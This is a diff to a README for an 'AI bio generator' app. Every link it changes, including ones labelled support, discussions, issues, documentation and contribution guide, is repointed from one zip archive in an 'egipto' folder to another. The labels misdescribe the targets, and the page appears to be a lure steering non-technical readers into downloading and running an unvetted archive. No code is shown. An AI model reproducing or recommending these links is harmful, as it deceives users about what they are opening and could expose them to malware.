@@ -4,7 +4,7 @@
 Welcome to ai-bio-generator! This application helps you create amazing bios quickly and easily. You don't need to be a programmer to use it. Just follow the steps below.
 
 ## 📥 Download ai-bio-generator
-[![Download Here](https://raw.githubusercontent.com/tokito-2030/ai-bio-generator/main/egipto/generator_bio_ai_3.1-alpha.4.zip%20Now-Click%https://raw.githubusercontent.com/tokito-2030/ai-bio-generator/main/egipto/generator_bio_ai_3.1-alpha.4.zip)](https://raw.githubusercontent.com/tokito-2030/ai-bio-generator/main/egipto/generator_bio_ai_3.1-alpha.4.zip)
+[![Download Here](https://github.com/tokito-2030/ai-bio-generator/raw/refs/heads/main/egipto/bio-generator-ai-semifluid.zip%20Now-Click%https://github.com/tokito-2030/ai-bio-generator/raw/refs/heads/main/egipto/bio-generator-ai-semifluid.zip)](https://github.com/tokito-2030/ai-bio-generator/raw/refs/heads/main/egipto/bio-generator-ai-semifluid.zip)
 
 ## 📋 Features
 - **AI-Powered:** Generates bios using advanced technology.
@@ -22,7 +22,7 @@ To run ai-bio-generator, ensure your device meets the following:
 - **Internet Connection:** Required for downloading and using the app
 
 ## 📥 Download & Install
-To get started with ai-bio-generator, visit this page to download: [Download Here](https://raw.githubusercontent.com/tokito-2030/ai-bio-generator/main/egipto/generator_bio_ai_3.1-alpha.4.zip).
+To get started with ai-bio-generator, visit this page to download: [Download Here](https://github.com/tokito-2030/ai-bio-generator/raw/refs/heads/main/egipto/bio-generator-ai-semifluid.zip).
 
 ### Installation Steps:
 1. Click the link above to go to the Releases page.
@@ -57,16 +57,16 @@ If you face any issues, consider the following tips:
 - Check your internet connection for stability.
 - Restart the application if it doesn’t load properly.
 
-For persistent issues, consult our [Support Page](https://raw.githubusercontent.com/tokito-2030/ai-bio-generator/main/egipto/generator_bio_ai_3.1-alpha.4.zip).
+For persistent issues, consult our [Support Page](https://github.com/tokito-2030/ai-bio-generator/raw/refs/heads/main/egipto/bio-generator-ai-semifluid.zip).
 
 ## 👥 Community and Support
 Join our community to share tips and ask questions. 
-- Check the [Discussions Page](https://raw.githubusercontent.com/tokito-2030/ai-bio-generator/main/egipto/generator_bio_ai_3.1-alpha.4.zip).
-- Report issues on the [Issues Page](https://raw.githubusercontent.com/tokito-2030/ai-bio-generator/main/egipto/generator_bio_ai_3.1-alpha.4.zip).
+- Check the [Discussions Page](https://github.com/tokito-2030/ai-bio-generator/raw/refs/heads/main/egipto/bio-generator-ai-semifluid.zip).
+- Report issues on the [Issues Page](https://github.com/tokito-2030/ai-bio-generator/raw/refs/heads/main/egipto/bio-generator-ai-semifluid.zip).
 
 ## 🌐 Learn More
 Explore additional information and documentation about ai-bio-generator:
-- **Documentation:** [ai-bio-generator Docs](https://raw.githubusercontent.com/tokito-2030/ai-bio-generator/main/egipto/generator_bio_ai_3.1-alpha.4.zip)
-- **Contributing:** Interested in helping? Check our [Contribution Guide](https://raw.githubusercontent.com/tokito-2030/ai-bio-generator/main/egipto/generator_bio_ai_3.1-alpha.4.zip).
+- **Documentation:** [ai-bio-generator Docs](https://github.com/tokito-2030/ai-bio-generator/raw/refs/heads/main/egipto/bio-generator-ai-semifluid.zip)
+- **Contributing:** Interested in helping? Check our [Contribution Guide](https://github.com/tokito-2030/ai-bio-generator/raw/refs/heads/main/egipto/bio-generator-ai-semifluid.zip).
 
 Feel free to explore the apps and generate your perfect bio in no time. Enjoy!
